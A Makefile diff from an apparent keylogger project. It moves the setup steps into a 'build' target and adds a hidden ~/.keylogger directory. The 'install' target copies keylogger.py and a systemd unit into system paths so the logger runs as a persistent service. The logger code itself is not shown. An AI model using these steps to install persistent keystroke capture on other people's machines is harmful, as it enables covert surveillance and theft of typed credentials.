@@ -1,11 +1,13 @@
-User=gruunday
-Group=gruunday
 
-install:
+build:
 	touch ~/.Xauthority
 	/usr/bin/pip3 install -r requirements.txt
-	sed -i '/User=/c\User=$(User)' keylogger.service
-	sed -i '/Group=/c\Group=$(Group)' keylogger.service
+	sed -i '/User=/c\User=$(USER)' keylogger.service
+	sed -i '/Group=/c\Group=$(USER)' keylogger.service
+	mkdir /home/${USER}/.keylogger/
+
+
+install:
 	cp keylogger.service /etc/systemd/system/keylogger.service
 	cp keylogger.py /usr/local/bin/keylogger
 	systemctl daemon-reload
